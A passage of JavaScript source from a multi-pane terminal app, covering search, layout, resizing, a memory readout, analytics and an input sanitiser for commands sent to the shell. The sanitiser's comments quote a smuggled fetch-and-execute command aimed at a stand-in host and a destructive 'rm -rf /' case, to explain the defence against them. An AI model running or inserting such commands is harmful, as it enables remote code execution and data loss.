// long-answered prompt scrolls out of view quickly.
const PROMPT_WINDOW_ROWS = 14;

function readBufferWindow(buffer, cursorRow, count) {
  const lines = [];
  const first = Math.max(0, cursorRow - count + 1);
  for (let probe = first; probe <= cursorRow; probe += 1) {
    lines.push(readBufferLine(buffer, probe));
  }
  return lines;
}

function readBufferLine(buffer, row) {
  const line = buffer.getLine(row);
  return line ? line.translateToString(true).replace(/\s+$/, "") : "";
}

function setAwaitingInput(terminal, awaiting) {
  const next = Boolean(awaiting);
  if (terminal.awaitingInput === next) return;
  terminal.awaitingInput = next;
  terminal.pane.classList.toggle("is-awaiting-input", next);
  if (next && terminal.id !== state.activeId) {
    toast(`\u2328 ${terminal.titleInput.value || "Terminal"} needs input`, "info", 3000);
  }
}

function markActivity(terminal, force) {
  if (terminal.id === state.activeId) return;
  // Ignore the shell's own startup banner right after the pane is created.
  if (!force && performance.now() - terminal.createdAt < 1200) return;

  terminal.pane.classList.add("has-activity");
  window.clearTimeout(terminal.activityTimer);
  terminal.activityTimer = window.setTimeout(() => {
    terminal.pane.classList.remove("has-activity");
  }, 4000);
}

function writelnTerminal(terminal, data) {
  // Status/banner lines must appear in order relative to buffered live output,
  // so drain any queued chunks before writing this line.
  flushTerminalOutput(terminal);
  terminal.term.writeln(data);
  appendTerminalSearchText(terminal, `${data}\n`);
  updateTerminalSearchVisibility(terminal);
}

// The per-pane text filter searches this rolling transcript. It is capped so it
// never grows without bound, but re-slicing a ~200 KB string on every append is
// wasteful under heavy output, so we only trim once it drifts past the cap by a
// margin (amortising the copy across many appends).
const SEARCH_TEXT_CAP = 200000;
const SEARCH_TEXT_TRIM_MARGIN = 40000;

// Maintaining the transcript costs a control-code strip plus a large string
// concat on every write, and nothing reads it unless the header filter is
// active — which is almost never. So while no filter is running we skip the work
// and just mark the transcript stale; the buffer xterm already keeps is the
// source of truth we rebuild from the moment a filter starts.
function isTerminalTranscriptNeeded() {
  return Boolean(normalizeSearchText(state.terminalSearch));
}

function appendTerminalSearchText(terminal, text) {
  if (!isTerminalTranscriptNeeded()) {
    terminal.searchTextStale = true;
    return;
  }
  let nextText = `${terminal.searchText || ""}\n${normalizeSearchText(stripTerminalControlCodes(text))}`;
  if (nextText.length > SEARCH_TEXT_CAP + SEARCH_TEXT_TRIM_MARGIN) {
    nextText = nextText.slice(-SEARCH_TEXT_CAP);
  }
  terminal.searchText = nextText;
}

// xterm's buffer already holds the rendered text with control codes resolved, so
// the rebuild is a plain line walk — no stripping needed.
function rebuildTerminalSearchText(terminal) {
  if (!terminal.searchTextStale) return;
  terminal.searchTextStale = false;
  const buffer = terminal.term?.buffer?.active;
  const lines = [];
  if (buffer) {
    for (let i = 0; i < buffer.length; i += 1) {
      lines.push(buffer.getLine(i)?.translateToString(true) || "");
    }
  }
  terminal.searchText = `${normalizeSearchText(terminalMetadataText(terminal))}\n${normalizeSearchText(lines.join("\n"))}`.slice(-SEARCH_TEXT_CAP);
}

function refreshTerminalSearchText(terminal) {
  terminal.searchText = `${normalizeSearchText(terminalMetadataText(terminal))}\n${terminal.searchText || ""}`.slice(-SEARCH_TEXT_CAP);
}

function terminalMetadataText(terminal) {
  return [
    terminal.titleInput.value,
    terminal.cwd,
    terminal.shell,
    terminal.statusElement.textContent
  ].filter(Boolean).join("\n");
}

function terminalMetadataMatches(terminal, query) {
  return normalizeSearchText(terminalMetadataText(terminal)).includes(normalizeSearchText(query));
}

// The header search runs the very same buffer search as Ctrl+Shift+F, so every
// match is highlighted where it sits. On top of that it hides panes with
// nothing to show, and brings them straight back — already highlighted — as
// soon as a keystroke makes them match again.
function applyTerminalSearch(options = {}) {
  if (state.terminalSearch) {
    // All three search surfaces drive each terminal's single search addon, so
    // the live filter takes the highlight session over from the find bars.
    closeAnyFind({ restoreFocus: false });
    closeFindAll({ restoreFocus: false });
  }
  runSearchPass(state.terminalSearch, { filter: true, ...options });
  rebalanceWebglRenderers();
}

function clearTerminalSearch() {
  if (!state.terminalSearch && !elements.terminalSearchInput.value) return;

  elements.terminalSearchInput.value = "";
  state.terminalSearch = "";
  applyTerminalSearch();
}

// Runs once per output frame, so it stays deliberately cheap: the rolling
// transcript decides visibility immediately, and the authoritative buffer pass
// (the one that repaints highlights) is deferred until a pane actually flips.
function updateTerminalSearchVisibility(terminal) {
  const query = normalizeSearchText(state.terminalSearch);
  if (!query) {
    setTerminalSearchHidden(terminal, false);
    return;
  }
  rebuildTerminalSearchText(terminal);
  if (setTerminalSearchHidden(terminal, !terminal.searchText.includes(query))) {
    scheduleTerminalSearchRefresh();
  }
}

function setTerminalSearchHidden(terminal, hidden) {
  const wasHidden = terminal.pane.classList.contains("is-search-hidden");
  if (hidden === wasHidden) return false;
  terminal.pane.classList.toggle("is-search-hidden", hidden);
  if (!hidden) scheduleFit(terminal);
  scheduleTerminalConnections();
  return true;
}

const TERMINAL_SEARCH_REFRESH_MS = 120;
let terminalSearchRefreshHandle = 0;

function scheduleTerminalSearchRefresh() {
  if (terminalSearchRefreshHandle) return;
  terminalSearchRefreshHandle = window.setTimeout(() => {
    terminalSearchRefreshHandle = 0;
    if (!state.terminalSearch) return;
    applyTerminalSearch({ preserveNav: true });
  }, TERMINAL_SEARCH_REFRESH_MS);
}

function normalizeSearchText(value) {
  return String(value || "").toLowerCase();
}

function stripTerminalControlCodes(value) {
  return String(value || "")
    .replace(/\x1b\][^\x07]*(?:\x07|\x1b\\)/g, "")
    .replace(/\x1b\[[0-?]*[ -/]*[@-~]/g, "")
    .replace(/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/g, "");
}

// Text on its way *into* a shell is held to a far stricter standard than text on
// its way out. Anything the app composes on the user's behalf — a queued command,
// a snippet, a broadcast, a slash-command argument — is presented as one literal
// line they get to read before it runs, so every character that could break that
// promise is removed rather than forwarded:
//
//   CR/LF  submit the line, turning "insert" into "execute" and letting a single
//          entry smuggle a second, hidden command ("echo ok\rcurl evil|iex");
//   ESC    and the rest of C0/C1 drive the terminal's own escape handling, which
//          can rewrite what the prompt appears to say;
//   TAB    triggers the shell's completion instead of inserting whitespace;
//   DEL    erases a character the user believes is there.
//
// Runs collapse to a single space, absorbing any whitespace on either side, so
// pasted multi-line text ("echo one\n  echo two") joins into one tidy line rather
// than a ragged one. This is deliberately the mirror image of
// stripTerminalControlCodes above, which keeps CR/LF/TAB because it is scrubbing
// shell *output* for display and search.
function sanitizeTerminalCommand(value) {
  return String(value ?? "")
    .replace(/\s*[\u0000-\u001f\u007f-\u009f\u2028\u2029]+\s*/g, " ")
    .trim();
}

// A single command line has a plausible ceiling; anything past it is a tampered
// or corrupted payload. Over-length input is *rejected* rather than truncated,
// because truncation is its own hazard — clipping "rm -rf /tmp/scratch" yields a
// still-runnable "rm -rf /".
const MAX_TERMINAL_COMMAND_LENGTH = 8192;

// Returns the command safe to hand to a PTY, or null when nothing usable is left.
function safeTerminalCommand(value) {
  const command = sanitizeTerminalCommand(value);
  if (!command || command.length > MAX_TERMINAL_COMMAND_LENGTH) return null;
  return command;
}

function sendBridge(message) {
  if (!state.socketReady || !state.socket || state.socket.readyState !== WebSocket.OPEN) return false;

  try {
    state.socket.send(JSON.stringify(message));
    return true;
  } catch {
    return false;
  }
}

// The bridge protocol is otherwise one-way; a few operations (opening a native
// file dialog) need an answer back. Requests carry a requestId the bridge echoes,
// and resolve to null when the bridge is unreachable or never replies.
const pendingBridgeRequests = new Map();

function requestBridge(message, { timeout = 300000 } = {}) {
  return new Promise((resolve) => {
    const requestId = createId();
    const settle = (value) => {
      const pending = pendingBridgeRequests.get(requestId);
      if (!pending) return;
      pendingBridgeRequests.delete(requestId);
      window.clearTimeout(pending.timer);
      resolve(value);
    };

    pendingBridgeRequests.set(requestId, {
      settle,
      timer: window.setTimeout(() => settle(null), timeout),
      type: message.type
    });
    if (!sendBridge({ ...message, requestId })) settle(null);
  });
}

// Returns true when the message answered a pending request, so the caller can
// stop routing it.
function resolveBridgeRequest(message, value) {
  const pending = message.requestId ? pendingBridgeRequests.get(message.requestId) : null;
  if (!pending) return false;
  pending.settle(value);
  return true;
}

function resolveBridgeRequestByType(type, value) {
  for (const pending of pendingBridgeRequests.values()) {
    if (pending.type !== type) continue;
    pending.settle(value);
    return true;
  }
  return false;
}

// Windows UAC-elevated terminals can't be hosted inside a non-elevated MultiTerm pane
// (ConPTY can't cross the integrity-level boundary), so the bridge launches the elevated
// shell in a separate console window via ShellExecute "runas" (raises the UAC prompt).
function newAdminTerminal(options = {}) {
  const shell = options.shell || elements.shellSelect.value || "pwsh";
  return addTerminal({
    elevated: true,
    shell,
    cwd: options.cwd,
    title: options.title || nextTitleForLabel("Administrator"),
    pendingCommand: options.pendingCommand,
    runStartup: Boolean(options.runStartup),
    reveal: true
  });
}

function updateTerminalActions() {
  const hasTerminals = state.terminals.size > 0;
  const canCloseAll = hasTerminals && state.socketReady;
  const label = hasTerminals
    ? state.socketReady ? "Close all terminal sessions" : "Bridge disconnected; cannot close all sessions"
    : "No terminal sessions to close";

  elements.closeAllTerminals.disabled = !canCloseAll;
  elements.closeAllTerminals.title = label;
  elements.closeAllTerminals.setAttribute("aria-label", label);
  updateLayoutMetrics();
  updateStatusBar();
}

function updateLayoutMetrics() {
  const count = Math.max(1, countVisibleTerminals());
  const cols = Math.ceil(Math.sqrt(count));
  const rows = Math.ceil(count / cols);
  elements.host.style.setProperty("--grid-cols", cols);
  elements.host.style.setProperty("--grid-rows", rows);
  elements.host.style.setProperty("--rest-count", Math.max(1, count - 1));
}

// Restoring a session calls addTerminal once per pane, and each call re-runs
// whole-app passes that only need to happen once: applySettings walks every
// terminal, renderPager rebuilds the whole tab strip, and the two snapshot saves
// stringify + write localStorage synchronously. That made restore O(N^2)
// (measured 17ms/pane at 2 panes rising to 34ms at 13). Wrapping a burst of
// addTerminal calls collapses each of those to a single pass at the end.
let terminalBatchDepth = 0;
const pendingBatchTasks = new Set();

function batchTerminalWork(run) {
  terminalBatchDepth += 1;
  try {
    return run();
  } finally {
    terminalBatchDepth -= 1;
    flushTerminalBatch();
  }
}

function isBatchingTerminalWork() {
  return terminalBatchDepth > 0;
}

// Returns true when the caller's work was deferred to the end of the batch.
function deferDuringBatch(taskName) {
  if (isBatchingTerminalWork()) {
    pendingBatchTasks.add(taskName);
    return true;
  }
  return false;
}

function flushTerminalBatch() {
  if (isBatchingTerminalWork()) return;
  const tasks = [...pendingBatchTasks];
  pendingBatchTasks.clear();
  for (const name of tasks) batchTaskRunners[name]();
}

// Declared after the helpers above only for readability; every entry is a hoisted
// function declaration, so the table is complete by the time anything runs.
const batchTaskRunners = {
  applySettings,
  renderPager,
  saveSessionSnapshot,
  saveTerminalPages
};

function applySettings() {
  if (deferDuringBatch("applySettings")) return;
  applyAppTheme();
  document.body.classList.toggle("header-hidden", state.settings.headerHidden);
  document.body.classList.toggle("sidecar-hidden", state.settings.sidecarHidden);
  applyPagerPlacement();
  elements.host.dataset.layout = state.settings.layout;
  elements.controlPanel.dataset.mode = state.settings.layout;
  elements.host.classList.toggle("compact", state.settings.compactChrome);
  state.settings.workspaceZoom = normalizeWorkspaceZoom(state.settings.workspaceZoom);
  const workspaceZoom = workspaceZoomScale();
  elements.host.style.zoom = String(workspaceZoom);
  elements.host.style.removeProperty("width");
  elements.host.style.removeProperty("height");
  elements.host.style.setProperty("--min-pane-width", `${state.settings.minWidth}px`);
  elements.host.style.setProperty("--fixed-columns", state.settings.columns);
  elements.host.style.setProperty("--fixed-rows", state.settings.rows);
  elements.host.style.setProperty("--pane-height", `${state.settings.paneHeight}px`);
  elements.host.style.setProperty("--focus-width", `${state.settings.focusWidth}%`);
  elements.host.style.setProperty("--pane-gap", `${state.settings.gap}px`);
  elements.host.style.setProperty("--title-font-scale", `${state.settings.titleFontScale}%`);

  elements.layoutMode.value = state.settings.layout;
  elements.minWidthValue.textContent = `${state.settings.minWidth}px`;
  elements.columnCountValue.textContent = state.settings.columns;
  elements.rowCountValue.textContent = state.settings.rows;
  elements.paneHeightValue.textContent = `${state.settings.paneHeight}px`;
  elements.focusWidthValue.textContent = `${state.settings.focusWidth}%`;
  elements.paneGapValue.textContent = `${state.settings.gap}px`;
  elements.workspaceZoomValue.textContent = `${state.settings.workspaceZoom}%`;
  elements.statusWorkspaceZoom.value = state.settings.workspaceZoom;
  elements.statusWorkspaceZoomValue.textContent = `${state.settings.workspaceZoom}%`;
  elements.fontSizeValue.textContent = `${state.settings.fontSize}px`;
  elements.titleFontScaleValue.textContent = `${state.settings.titleFontScale}%`;
  updateChromeToggles();
  applySnapLayout();

  const fontFamily = fontStacks[state.settings.fontFamily] || fontStacks["Cascadia Mono"];
  for (const terminal of state.terminals.values()) {
    terminal.term.options.fontSize = terminalFontSize(terminal);
    terminal.term.options.fontFamily = fontFamily;
    terminal.term.options.cursorStyle = state.settings.cursorStyle;
    terminal.term.options.cursorBlink = state.settings.cursorBlink;
    terminal.term.options.theme = themes[state.settings.theme];
    terminal.term.options.scrollback = effectiveScrollback();
    applyManualLayout(terminal, ensureManualLayout(terminal.id));
    updateTerminalNotificationButton(terminal);
    scheduleFit(terminal);
  }
  if (!elements.terminalNotificationFlyout.hidden) renderTerminalNotificationFlyout();
  if (!state.settings.highlightInputPrompts) {
    for (const terminal of state.terminals.values()) setAwaitingInput(terminal, false);
  }
  updateLayoutMetrics();
  updateStatusBar();
  updateMinimizedDock();
  refreshComboboxes();
}

function resolveAppTheme() {
  if (state.settings.appTheme === "light") return "light";
  if (state.settings.appTheme === "dark") return "dark";
  return systemThemeQuery.matches ? "dark" : "light";
}

function applyAppTheme() {
  const resolved = resolveAppTheme();
  document.documentElement.dataset.appTheme = resolved;
  if (elements.themeToggle) {
    const icon = resolved === "dark" ? "sun" : "moon";
    elements.themeToggle.innerHTML = `<i data-lucide="${icon}"></i>`;
    refreshIcons();
  }
}

function toggleAppTheme() {
  const resolved = resolveAppTheme();
  state.settings.appTheme = resolved === "dark" ? "light" : "dark";
  elements.appTheme.value = state.settings.appTheme;
  applySettings();
  saveSettings();
  log.info("ui", `App theme set to ${state.settings.appTheme}`);
  toast(`${state.settings.appTheme === "dark" ? "Dark" : "Light"} theme`, "info", 1600);
}

function updateStatusBar() {
  const count = state.terminals.size;
  elements.statusSessions.textContent = `${count} ${count === 1 ? "session" : "sessions"}`;
  const active = state.activeId ? state.terminals.get(state.activeId) : null;
  const shellValue = active?.shell || elements.shellSelect.value;
  elements.statusShellText.textContent = shellValue === "powershell" ? "Windows PowerShell" : "PowerShell 7";
  const online = state.socketReady;
  elements.statusConn.textContent = online ? "Connected" : "Disconnected";
  elements.statusConn.dataset.tone = online ? "online" : "offline";
  updateFontZoomControls();
}

function updateFontZoomControls() {
  const atMin = state.settings.fontSize <= MIN_FONT_SIZE;
  const atMax = state.settings.fontSize >= MAX_FONT_SIZE;

  elements.statusZoomOut.disabled = atMin;
  elements.statusZoomIn.disabled = atMax;

  const downLabel = atMin ? `Default font size is already at minimum (${MIN_FONT_SIZE}px)` : "Decrease default terminal font size (Ctrl+-)";
  const upLabel = atMax ? `Default font size is already at maximum (${MAX_FONT_SIZE}px)` : "Increase default terminal font size (Ctrl++)";
  elements.statusZoomOut.title = downLabel;
  elements.statusZoomOut.setAttribute("aria-label", downLabel);
  elements.statusZoomIn.title = upLabel;
  elements.statusZoomIn.setAttribute("aria-label", upLabel);
}

function updateChromeToggles() {
  setChromeToggle(elements.toggleHeader, state.settings.headerHidden, "Expand top bar", "Collapse top bar");
  setChromeToggle(elements.toggleSidecar, state.settings.sidecarHidden, "Show layout controls", "Hide layout controls");
  setChromeToggle(elements.toggleHeaderTop, state.settings.headerHidden, "Expand top bar", "Collapse top bar");
  setChromeToggle(elements.toggleSidecarTop, state.settings.sidecarHidden, "Show layout controls", "Hide layout controls");
}

function setChromeToggle(button, isHidden, showLabel, hideLabel) {
  const label = isHidden ? showLabel : hideLabel;
  button.setAttribute("aria-label", label);
  button.setAttribute("aria-pressed", String(isHidden));
  button.title = label;
}

function fitAllTerminals() {
  for (const terminal of state.terminals.values()) {
    scheduleFit(terminal);
  }
}

// A continuous window drag fires the ResizeObserver — and thus the VISUAL fit
// below — dozens of times per second, and so does dragging the workspace-zoom
// slider. That fit is cheap and keeps the panes
// tracking the layout smoothly, but forwarding every intermediate size to the
// shell makes its line editor (PSReadLine) repaint the prompt at dozens of
// widths per second; those repaints race xterm's own reflow and corrupt the
// rendered line, stranding the cursor far from the visible prompt. So while such
// a gesture is in flight we hold the PTY resize (WINCH) back and forward a
// single settled size once it stops — the shell then repaints exactly
// once, at the size the gesture landed on.
//
// Crucially the deferral is gated on an ACTIVE gesture. Terminal
// creation and pane/layout changes drive the ResizeObserver too, but WITHOUT a
// window "resize" event or a zoom step, so those forward immediately (identical to the historic
// behaviour). A delayed creation/layout resize would let the shell's resize
// repaint land after other code wrote straight into the buffer and clobber it.
const RESIZE_DRAG_IDLE_MS = 150;
let resizeDragActive = false;
let resizeDragIdleHandle = 0;

// Fired on every window "resize" event and every workspace-zoom step: mark a
// gesture in flight and (re)arm the idle timer that ends it. A one-off resize
// (maximize/snap) trips this once and
// settles after RESIZE_DRAG_IDLE_MS; a drag keeps it armed until motion stops.
function noteResizeGesture() {
  resizeDragActive = true;
  if (resizeDragIdleHandle) {
    window.clearTimeout(resizeDragIdleHandle);
  }
  resizeDragIdleHandle = window.setTimeout(endResizeGesture, RESIZE_DRAG_IDLE_MS);
}

// The gesture has settled: forward the final size of every terminal so each shell
// repaints once at the size it ended on.
function endResizeGesture() {
  resizeDragIdleHandle = 0;
  resizeDragActive = false;
  for (const terminal of state.terminals.values()) {
    sendResize(terminal, terminal.term.cols, terminal.term.rows);
  }
}

// Collapses the pane's secondary header actions into the overflow menu once the
// pane is too narrow to show the full button row without crowding the title.
// Driven by the pane's own width (via its ResizeObserver) so it responds to added
// terminals, layout changes and window resizes alike — not just the manual
// "Compact chrome" setting.
function updatePaneDensity(terminal) {
  const width = terminal.pane.clientWidth;
  // A hidden (minimized) pane reports 0; leave its current state alone until it
  // is laid out again, so restoring it doesn't flash the wrong control set.
  if (!width) return;
  terminal.pane.classList.toggle("is-narrow", width < PANE_OVERFLOW_WIDTH);
}

function scheduleFit(terminal) {
  // The ResizeObserver watches both the pane and its screen, so a single layout
  // change can fire this twice; coalesce to one visual fit per animation frame.
  if (terminal.fitScheduled) return;
  terminal.fitScheduled = true;
  window.requestAnimationFrame(() => {
    terminal.fitScheduled = false;
    // A pane on an inactive page is display:none, so it measures as zero and
    // would resize the pty down to a nonsense size. applyPageVisibility refits
    // it when the page comes back.
    if (terminal.pane.classList.contains("is-page-hidden")) return;
    try {
      terminal.fitAddon.fit();
    } catch {
      return;
    }
    queueResize(terminal, terminal.term.cols, terminal.term.rows);
  });
}

// Both fitAddon.fit() (above) and term.onResize funnel here. Outside a window
// drag the size is forwarded immediately; during a drag it is suppressed and
// endWindowResizeDrag() forwards the settled size once motion stops.
function queueResize(terminal, cols, rows) {
  if (resizeDragActive || paneResizeActive) return;
  sendResize(terminal, cols, rows);
}

// Single funnel for pty resize messages. queueResize routes both the fit path
// and term.onResize into here, sharing one dedupe guard: identical dimensions
// never hit the bridge twice. The cache only advances on a successful send, so a
// resize attempted while the bridge is offline is retried (not suppressed) once
// queueResize runs again after reconnect.
function sendResize(terminal, cols, rows) {
  if (terminal.lastSentCols === cols && terminal.lastSentRows === rows) return;
  if (sendBridge({ type: "resize", id: terminal.id, cols, rows })) {
    terminal.lastSentCols = cols;
    terminal.lastSentRows = rows;
  }
}

function resetLayout() {
  clearSnapLayout(false);

  if (state.settings.layout === "manual") {
    let index = 0;
    for (const terminal of state.terminals.values()) {
      state.manualLayouts[terminal.id] = defaultManualLayout(index);
      applyManualLayout(terminal, state.manualLayouts[terminal.id]);
      index += 1;
    }
    saveManualLayouts();
  } else {
    state.settings = { ...defaultSettings, theme: state.settings.theme };
    elements.layoutMode.value = state.settings.layout;
    elements.minWidth.value = state.settings.minWidth;
    elements.columnCount.value = state.settings.columns;
    elements.rowCount.value = state.settings.rows;
    elements.paneHeight.value = state.settings.paneHeight;
    elements.focusWidth.value = state.settings.focusWidth;
    elements.paneGap.value = state.settings.gap;
    elements.workspaceZoom.value = state.settings.workspaceZoom;
    elements.statusWorkspaceZoom.value = state.settings.workspaceZoom;
    elements.fontSize.value = state.settings.fontSize;
    elements.titleFontScale.value = state.settings.titleFontScale;
    elements.compactChrome.checked = state.settings.compactChrome;
    elements.syncInput.checked = state.settings.syncInput;
    applySettings();
    saveSettings();
  }
  fitAllTerminals();
}

function ensureManualLayout(id) {
  if (!state.manualLayouts[id]) {
    state.manualLayouts[id] = defaultManualLayout(state.terminals.size - 1);
  }
  return state.manualLayouts[id];
}

function defaultManualLayout(index) {
  const host = elements.host;
  const padding = 16;
  const gap = Math.max(12, Number(state.settings.gap) || 10);
  const hostWidth = host?.clientWidth || window.innerWidth || 520;
  const availableWidth = Math.max(260, hostWidth - padding * 2);
  const paneWidth = Math.min(460, availableWidth);
  const paneHeight = 280;
  const strideX = paneWidth + gap;
  const strideY = paneHeight + gap;
  const columns = Math.max(1, Math.floor((availableWidth + gap) / strideX));
  const safeIndex = Math.max(0, index);
  const column = safeIndex % columns;
  const row = Math.floor(safeIndex / columns);
  return {
    h: paneHeight,
    w: paneWidth,
    x: (host?.scrollLeft || 0) + padding + column * strideX,
    y: (host?.scrollTop || 0) + padding + row * strideY
  };
}

function applyManualLayout(terminal, layout) {
  terminal.pane.style.setProperty("--manual-x", `${layout.x}px`);
  terminal.pane.style.setProperty("--manual-y", `${layout.y}px`);
  terminal.pane.style.setProperty("--manual-w", `${layout.w}px`);
  terminal.pane.style.setProperty("--manual-h", `${layout.h}px`);
  scheduleTerminalConnections();
}

function syncManualLayout(terminal) {
  if (state.settings.layout !== "manual") return;

  const layout = ensureManualLayout(terminal.id);
  const rect = terminal.pane.getBoundingClientRect();
  const zoom = workspaceZoomScale();
  layout.w = Math.round(rect.width / zoom);
  layout.h = Math.round(rect.height / zoom);
  saveManualLayouts();
  scheduleFit(terminal);
}

function revealTerminal(terminal) {
  window.requestAnimationFrame(() => {
    terminal.pane.scrollIntoView({ block: "nearest", inline: "nearest" });
    scheduleFit(terminal);
  });
}

function setBridgeStatus(text, tone) {
  elements.bridgeStatus.textContent = text;
  elements.bridgeStatus.dataset.tone = tone;
}

// Every reading costs the bridge a ~1s Win32_Process query, so the status bar
// asks for one only while the user is actually looking at the memory chip.
// Hover (or keyboard focus) opens the readout and starts a slow refresh loop;
// leaving collapses it and stops asking. Rendering is text-only and all the
// process-walking happens in the bridge, so the UI thread is never blocked.
const MEM_REFRESH_MS = 4000;

function bindMemStatus() {
  const chip = elements.statusMem;
  if (!chip) return;
  chip.addEventListener("pointerenter", openMemStatus);
  chip.addEventListener("pointerleave", closeMemStatus);
  chip.addEventListener("focus", openMemStatus);
  chip.addEventListener("blur", closeMemStatus);
  // Tapping is the touch equivalent of hovering; it also lets a click pin the
  // reading open long enough to read it on a trackpad.
  chip.addEventListener("click", (event) => {
    event.preventDefault();
    if (state.mem.open) requestMemStats();
    else openMemStatus();
  });
}

function openMemStatus() {
  const chip = elements.statusMem;
  if (!chip || state.mem.open) return;
  state.mem.open = true;
  chip.classList.add("is-open");
  chip.setAttribute("aria-expanded", "true");
  renderMemStatus();
  requestMemStats();
  clearInterval(state.mem.timer);
  state.mem.timer = setInterval(requestMemStats, MEM_REFRESH_MS);
}

function closeMemStatus() {
  const chip = elements.statusMem;
  if (!chip) return;
  state.mem.open = false;
  chip.classList.remove("is-open");
  chip.setAttribute("aria-expanded", "false");
  clearInterval(state.mem.timer);
  state.mem.timer = null;
  // Blank the live region while collapsed so a screen reader doesn't re-read a
  // stale figure, and so the collapsed chip has no width to animate from.
  if (elements.statusMemText) elements.statusMemText.textContent = "";
}

function requestMemStats() {
  if (state.mem.unsupported) return;
  state.mem.requested = true;
  if (!sendBridge({ type: "memstats" })) {
    // Bridge is down/reconnecting: keep whatever we last showed rather than
    // flashing an error, but make it clear nothing has arrived yet.
    if (!state.mem.stats) setMemStatusText("bridge offline");
  }
}

function updateMemStatus(stats) {
  if (stats && stats.supported === false) {
    state.mem.unsupported = true;
    state.mem.unsupportedReason = stats.reason || null;
    state.mem.stats = null;
    clearInterval(state.mem.timer);
    state.mem.timer = null;
    renderMemStatus();
    return;
  }
  if (stats && stats.error) {
    state.mem.stats = null;
    renderMemStatus(stats.error);
    return;
  }
  state.mem.stats = {
    app: Number(stats.app) || 0,
    systemUsed: Number(stats.systemUsed) || 0,
    systemTotal: Number(stats.systemTotal) || 0
  };
  renderMemStatus();
}

function renderMemStatus(errorText) {
  const chip = elements.statusMem;
  if (!chip || !elements.statusMemText) return;

  if (state.mem.unsupported) {
    chip.title = state.mem.unsupportedReason === "bridge"
      ? "Memory usage isn't supported by this MultiTerm bridge"
      : "Memory usage is only available on Windows";
    setMemStatusText("unavailable");
    return;
  }

  const stats = state.mem.stats;
  if (!stats) {
    chip.title = "Memory used by MultiTerm and its terminals \u2014 hover to read live usage";
    setMemStatusText(errorText || (state.mem.requested ? "reading\u2026" : ""));
    return;
  }

  const pct = stats.systemUsed > 0 ? (stats.app / stats.systemUsed) * 100 : 0;
  chip.title = `MultiTerm + terminals: ${formatBytes(stats.app)} \u2014 system memory in use: ${formatBytes(stats.systemUsed)} of ${formatBytes(stats.systemTotal)}`;
  setMemStatusText(`${formatBytes(stats.app)} / ${formatBytes(stats.systemUsed)} (${pct.toFixed(1)}%)`);
}

// Only paint while expanded: the collapsed chip is glyph-only, and writing to
// the aria-live region would otherwise announce readings nobody asked for.
function setMemStatusText(text) {
  if (!state.mem.open) return;
  elements.statusMemText.textContent = text;
}

function formatBytes(bytes) {
  const value = Number(bytes) || 0;
  if (value >= 1024 ** 3) return `${(value / 1024 ** 3).toFixed(1)} GB`;
  if (value >= 1024 ** 2) return `${Math.round(value / 1024 ** 2)} MB`;
  if (value >= 1024) return `${Math.round(value / 1024)} KB`;
  return `${value} B`;
}

function loadSettings() {
  try {
    const settings = { ...defaultSettings, ...JSON.parse(localStorage.getItem("multiterm.settings") || "{}") };
    settings.headerActionDragScope = normalizeHeaderActionDragScope(settings.headerActionDragScope);
    settings.headerActionsInMenu = normalizeHeaderActionsInMenu(settings.headerActionsInMenu);
    settings.pageCloseAction = normalizePageCloseAction(settings.pageCloseAction);
    settings.titleFontScale = normalizeTitleFontScale(settings.titleFontScale);
    settings.workspaceZoom = normalizeWorkspaceZoom(settings.workspaceZoom);
    return settings;
  } catch {
    return { ...defaultSettings };
  }
}

function analyticsDayKey(date = new Date()) {
  const year = date.getFullYear();
  const month = String(date.getMonth() + 1).padStart(2, "0");
  const day = String(date.getDate()).padStart(2, "0");
  return `${year}-${month}-${day}`;
}

function analyticsCount(value) {
  const number = Number(value);
  return Number.isFinite(number) && number >= 0 ? number : 0;
}

function emptyTerminalAnalytics() {
  return {
    dayKey: analyticsDayKey(),
    terminals: {},
    todayFocusMs: 0,
    todayKeystrokes: 0,
    totalFocusMs: 0,
    totalKeystrokes: 0,
    version: 1
  };
}

function loadTerminalAnalytics() {
  const empty = emptyTerminalAnalytics();
  try {
    const parsed = JSON.parse(localStorage.getItem(TERMINAL_ANALYTICS_STORAGE_KEY) || "null");
    if (!parsed || typeof parsed !== "object" || Array.isArray(parsed)) return empty;
    const terminals = {};
    for (const [id, value] of Object.entries(parsed.terminals || {})) {
      if (!value || typeof value !== "object" || Array.isArray(value)) continue;
      terminals[id] = {
        focusMs: analyticsCount(value.focusMs),
        keystrokes: analyticsCount(value.keystrokes),
        startedAt: typeof value.startedAt === "string" ? value.startedAt : null,
        title: typeof value.title === "string" && value.title.trim() ? value.title.trim() : "Terminal"
      };
    }
    const analytics = {
      dayKey: typeof parsed.dayKey === "string" ? parsed.dayKey : empty.dayKey,
      terminals,
      todayFocusMs: analyticsCount(parsed.todayFocusMs),
      todayKeystrokes: analyticsCount(parsed.todayKeystrokes),
      totalFocusMs: analyticsCount(parsed.totalFocusMs),
      totalKeystrokes: analyticsCount(parsed.totalKeystrokes),
      version: 1
    };
    if (analytics.dayKey !== empty.dayKey) {
      analytics.dayKey = empty.dayKey;
      analytics.todayFocusMs = 0;
      analytics.todayKeystrokes = 0;
    }
    return analytics;
  } catch {
    return empty;
  }
}

function saveTerminalAnalytics() {
  localStorage.setItem(TERMINAL_ANALYTICS_STORAGE_KEY, JSON.stringify(state.analytics));
}

function formatAnalyticsDuration(value) {
  let seconds = Math.max(0, Math.floor(analyticsCount(value) / 1000));
  const days = Math.floor(seconds / 86400);
  seconds %= 86400;
  const hours = Math.floor(seconds / 3600);
  seconds %= 3600;
  const minutes = Math.floor(seconds / 60);
  seconds %= 60;
  if (days) return `${days}d ${hours}h`;
  if (hours) return `${hours}h ${minutes}m`;
  if (minutes) return `${minutes}m ${seconds}s`;
  return `${seconds}s`;
}

function pendingTerminalAnalyticsFocus(terminalId = null) {
  const runtime = state.analyticsRuntime;
  if (!runtime.focusedTerminalId || !runtime.focusStartedAt) return 0;
  if (terminalId && runtime.focusedTerminalId !== terminalId) return 0;
  return Math.max(0, performance.now() - runtime.focusStartedAt);
}

function renderTerminalAnalytics() {
  if (!elements.analyticsTerminalList) return;
  ensureAnalyticsCurrentDay();
  const pendingFocus = pendingTerminalAnalyticsFocus();
  elements.analyticsTodayKeystrokes.textContent = formatStatisticCount(state.analytics.todayKeystrokes);
  elements.analyticsTodayFocus.textContent = formatAnalyticsDuration(state.analytics.todayFocusMs + pendingFocus);
  elements.analyticsTotalKeystrokes.textContent = formatStatisticCount(state.analytics.totalKeystrokes);
  elements.analyticsTotalFocus.textContent = formatAnalyticsDuration(state.analytics.totalFocusMs + pendingFocus);
